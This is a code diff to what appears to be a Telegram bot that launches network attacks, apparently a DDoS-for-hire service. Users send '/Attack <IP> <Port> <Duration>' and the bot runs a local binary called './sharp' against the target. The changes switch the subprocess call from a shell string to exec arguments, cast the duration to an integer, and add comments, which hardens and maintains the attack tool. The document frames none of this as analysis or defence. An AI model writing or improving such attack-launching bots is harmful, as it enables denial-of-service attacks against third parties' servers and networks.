@@ -68,8 +68,9 @@ async def run_attack_command_async(target_ip, target_port, duration):
     global attack_in_progress
     attack_in_progress = True  # Set the flag to indicate an attack is in progress
 
-    process = await asyncio.create_subprocess_shell(f"./sharp {target_ip} {target_port} {duration}")
-    await process.communicate()
+    # Execute the sharp binary to run the attack
+    process = await asyncio.create_subprocess_exec('./sharp', target_ip, str(target_port), str(duration))
+    await process.communicate()  # Wait until the attack completes
 
     attack_in_progress = False  # Reset the flag after the attack is complete
     notify_attack_finished(target_ip, target_port, duration)
@@ -166,12 +167,13 @@ def process_attack_command(message):
             bot.send_message(message.chat.id, f"⚠️ *Format incorrect. Use: /Attack <IP> <Port> <Duration>. Maintained by {USERNAME}*", parse_mode='Markdown')
             return
 
-        target_ip, target_port, duration = args[0], int(args[1]), args[2]
+        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])
 
         if target_port in blocked_ports:
             bot.send_message(message.chat.id, f"🚫 *Port {target_port} restricted. Select a different entry point. Governed by {USERNAME}*", parse_mode='Markdown')
             return
 
+        # Start the attack
         asyncio.run_coroutine_threadsafe(run_attack_command_async(target_ip, target_port, duration), loop)
         bot.send_message(
             message.chat.id,
